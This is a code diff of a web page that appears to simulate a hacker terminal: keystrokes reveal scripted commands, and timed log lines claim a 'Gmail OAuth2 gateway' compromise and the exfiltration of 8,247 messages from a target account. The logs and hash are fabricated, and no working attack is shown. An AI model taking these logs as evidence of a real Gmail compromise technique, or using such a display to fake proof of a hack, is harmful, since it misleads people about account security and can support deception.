+            { t: "[21:41:53] Archive created: /mnt/data/exfil/gmail_full_20260704_2141.tar.gz (47.8 MB)", c: "log-success", d: 2120 },
+            { t: "[21:41:53] SHA-256: a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2", c: "log-debug", d: 2260 },
+            { t: "\n╔══════════════════════════════════════════════════════════════════════╗", c: "log-error", d: 2420 },
+            { t: "║  ⚠ CRITICAL: GMAIL OAUTH2 GATEWAY FULLY COMPROMISED               ║", c: "log-error", d: 2540 },
+            { t: "║  ALL EMAIL DATA EXFILTRATED SUCCESSFULLY                          ║", c: "log-error", d: 2660 },
+            { t: "║  TARGET: target.account@gmail.com                                ║", c: "log-error", d: 2780 },
+            { t: "║  TOTAL MESSAGES: 8,247 | ARCHIVE: 47.8 MB                        ║", c: "log-error", d: 2900 },
+            { t: "╚══════════════════════════════════════════════════════════════════════╝\n", c: "log-error", d: 3040 }
           ]
         }
       ];
@@ -326,25 +479,18 @@
         viewport.scrollTop = viewport.scrollHeight;
       }
 
-      // stream log entries with realistic delays and visual feedback
       async function streamLogOutput(streams) {
         streamingActive = true;
         for (let entry of streams) {
           await new Promise(resolve => setTimeout(resolve, entry.d));
           const lineDiv = document.createElement('div');
           lineDiv.className = entry.c;
-          // Add subtle timestamp prefix for realism
-          if (entry.c !== 'log-json' && entry.c !== 'log-ok' && entry.c !== 'log-fail') {
-            const timeStr = new Date().toTimeString().split(' ')[0];
-            lineDiv.innerHTML = `<span class="log-timestamp">[${timeStr}]</span> ${entry.t}`;
-          } else {
-            lineDiv.innerText = entry.t;
-          }
+          const timeStr = new Date().toTimeString().split(' ')[0];
+          lineDiv.innerHTML = `<span class="log-timestamp">[${timeStr}]</span>${entry.t}`;
           historyEl.appendChild(lineDiv);
           forceScroll();
         }
 
-        // spacing after command block
         const spacer = document.createElement('br');
         historyEl.appendChild(spacer);
         forceScroll();
@@ -354,14 +500,12 @@
         visibleCmdBuffer.innerText = "";
         streamingActive = false;
 
-        // if all steps done
         if (indexStep >= telemetricSequence.length) {
           overlayBox.style.display = 'block';
-          overlayBox.innerText = "[ ✅ অডিট সম্পন্ন: রিমোট হোস্ট থেকে সংযোগ বিচ্ছিন্ন ]";
+          overlayBox.innerHTML = '✅ <b>অডিট সম্পন্ন:</b> সমস্ত ফেজ সফলভাবে সম্পাদিত হয়েছে | রিমোট সংযোগ বিচ্ছিন্ন';
         }
       }
 
-      // key input simulation
       hiddenInput.addEventListener('input', (e) => {
         if (streamingActive || indexStep >= telemetricSequence.length) {
           hiddenInput.value = "";
@@ -369,43 +513,37 @@
         }
 
         const currentScenario = telemetricSequence[indexStep];
-        const charsPerStroke = Math.floor(Math.random() * 4) + 5; // faster typing
+        const charsPerStroke = Math.floor(Math.random() * 5) + 6;
         const nextSlice = currentScenario.cmd.substring(indexChar, indexChar + charsPerStroke);
-        
+
         if (nextSlice) {
           visibleCmdBuffer.innerText += nextSlice;
           indexChar += charsPerStroke;
         }
-        
+
         hiddenInput.value = "";
         forceScroll();
 
-        // when command fully typed
         if (indexChar >= currentScenario.cmd.length) {
-          // add completed prompt line to history
           const promptDiv = document.createElement('div');
           promptDiv.innerHTML = `
-            <span class="k-blue">┌──(</span><span class="k-red">root㉿sec-ops-node-04</span><span class="k-blue">)-[</span><span class="k-text">~/audit/google/oauth2</span><span class="k-blue">]</span><br>
-            <span class="k-blue">└─</span><span class="k-red">#</span> <span class="cmd-line">${currentScenario.cmd}</span>
+            <span class="kali-blue">┌──(</span><span class="kali-red">root㉿sec-ops-node-04</span><span class="kali-blue">)-[</span><span class="kali-path">~/audit/google/oauth2</span><span class="kali-blue">]</span><br>
+            <span class="kali-blue">└─</span><span class="kali-red">#</span> <span class="cmd-line">${currentScenario.cmd}</span>
           `;
           historyEl.appendChild(promptDiv);
           visibleCmdBuffer.innerText = "";
-          
           streamLogOutput(currentScenario.streams);
         }
       });
 
-      // ensure focus on any interaction
       document.addEventListener('keydown', (e) => {
         focusTerminal();
-        // prevent accidental page scroll on space/arrows
         if (e.key === ' ' || e.key.startsWith('Arrow')) {
           e.preventDefault();
         }
       });
 
       document.addEventListener('touchstart', focusTerminal);
-      
       window.onload = () => {
         setTimeout(focusTerminal, 400);
       };
